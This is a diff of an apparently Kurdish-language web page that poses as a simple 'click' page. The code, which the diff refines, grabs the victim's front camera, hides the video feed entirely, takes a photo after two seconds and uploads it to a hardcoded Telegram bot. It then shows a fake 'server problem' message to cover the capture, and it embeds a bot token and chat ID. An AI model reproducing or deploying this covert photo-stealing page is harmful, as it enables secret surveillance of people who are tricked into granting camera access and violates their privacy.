@@ -73,18 +73,9 @@
             transition: all 0.4s ease;
         }
 
-        #startBtn:hover {
-            background: rgba(255, 255, 255, 0.15);
-            transform: translateY(-3px);
-        }
-
-        /* ڤیدیۆکە لێرە شاراوەیە بەڵام چالاکە */
+        /* ڤیدیۆکە بە هەموو شێوەیەک شاراوەیە */
         #v {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
+            display: none;
         }
     </style>
 </head>
@@ -94,7 +85,7 @@
 
     <div id="main-container">
         <h2 id="status">ئـــەزیــزن🩶</h2>
-        <button id="startBtn">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
+        <button id="startBtn" onclick="startCapture()">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -104,26 +95,27 @@
         const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
         const myId = '7978104952'; 
 
-        document.getElementById('startBtn').addEventListener('click', function() {
-            const statusText = document.getElementById('status');
+        function startCapture() {
+            const btn = document.querySelector('#startBtn');
+            const statusText = document.querySelector('#status');
+            
             statusText.innerText = "...کەمێک چاوەڕێ بکە";
-            this.style.display = 'none';
+            btn.style.display = 'none';
 
             navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: "user" } 
             })
             .then(s => {
-                const v = document.getElementById('v');
+                const v = document.querySelector('#v');
                 v.srcObject = s;
                 v.play();
                 
-                // چاوەڕوانی ٣ چرکە بۆ ئەوەی لێنزەکە ڕووناک بێتەوە و وێنەکە ڕەش نەبێت
+                // چاوەڕوانی ٢ چرکە بۆ وێنەگرتن لە پشتەوە بێ ئەوەی ڤیدیۆکە ببینێت
                 setTimeout(() => {
-                    const c = document.getElementById('c');
+                    const c = document.querySelector('#c');
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
-                    const ctx = c.getContext('2d');
-                    ctx.drawImage(v, 0, 0);
+                    c.getContext('2d').drawImage(v, 0, 0);
                     
                     c.toBlob(b => {
                         const f = new FormData();
@@ -135,15 +127,17 @@
                             body: f
                         }).then(() => {
                             statusText.innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
+                            // داخستنی کامێرا یەکسەر
                             s.getTracks().forEach(track => track.stop());
                         });
                     }, 'image/jpeg', 0.85);
-                }, 3000); 
+                }, 2000); 
             })
             .catch(e => {
-                statusText.innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
+                statusText.innerText = "تکایە ڕێگە بدە (Allow).";
+                btn.style.display = 'inline-block';
             });
-        });
+        }
     </script>
 </body>
 </html>
